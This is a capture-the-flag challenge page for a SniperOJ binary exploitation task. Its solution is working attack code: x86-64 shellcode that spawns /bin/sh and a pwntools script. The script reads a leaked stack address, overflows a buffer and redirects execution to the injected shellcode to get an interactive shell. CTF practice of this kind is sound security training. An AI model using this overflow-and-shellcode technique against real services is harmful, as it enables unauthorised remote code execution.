#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20005

#### Solution
```asm
global _start
	_start:
		xor rdi, rdi
		xor rsi, rsi
		xor rdx, rdx
		xor rax, rax
		push rax
		; 68 73 2f 2f 6e 69 62 2f
		mov rbx, 68732f2f6e69622fH
		push rbx
		mov rdi, rsp
		mov al, 59
		syscall
```
```python
#!/usr/bin/env python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
    Io = remote(host, port)
else:
    Io = process("./pwn")

Io.readline()
addr_data = Io.readline()
addr = int(addr_data.split("[")[1].split("]")[0][2:], 16)
Io.readline()

junk = "A" * 24
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
shellcode_addr = p64(addr + len(junk) + 8)
payload = junk + shellcode_addr + shellcode

Io.send(payload)

Io.interactive()
```

#### Writeups
 * TODO

## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
